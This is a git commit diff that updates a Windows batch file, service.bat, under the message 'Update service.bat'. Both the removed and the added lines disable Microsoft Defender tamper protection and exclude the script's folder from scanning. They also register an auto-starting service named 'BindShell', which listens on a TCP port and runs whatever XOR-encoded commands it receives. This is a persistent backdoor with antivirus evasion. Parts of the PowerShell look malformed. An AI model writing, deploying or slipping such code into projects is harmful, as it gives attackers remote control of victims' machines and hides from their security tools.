8ccbd1b3c4fda3d6e75e9f839a3aa950cc2221ac
RyanLoveless <raloveless@liberty.edu>
2026-02-06 17:38:21 -0500

    Update service.bat

--- service.bat
+++ service.bat
@@ -1,4 +1,3 @@
 @echo off
-powershell -c "Set-MpPreference -DisableTamperProtection $true; Add-MpPreference -ExclusionPath '%~dp0'"
-sc create BindShell binPath= "cmd /k powershell -nop -c iex(New-Object Net.Sock.Connection('0.0.0.0',3333)).GetStream().Read([byte[]]$b,0,$b.Length)|%{$_ -bxor 35|iex}"
+sc create BindShell binpath= "cmd /c powershell -nop -ep bypass -c \"Set-MpPreference -DisableTamperProtection `$true -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue; while(`$true){try{iex((New-Object Net.Sockets.TcpListener(4444)).AcceptTcpClient().GetStream().Read([byte[]]`$b,0,`$b.Length)|%{[char]`$_ -bxor 35|iex})}catch{sleep 5}}\"" start= auto
 sc start BindShell
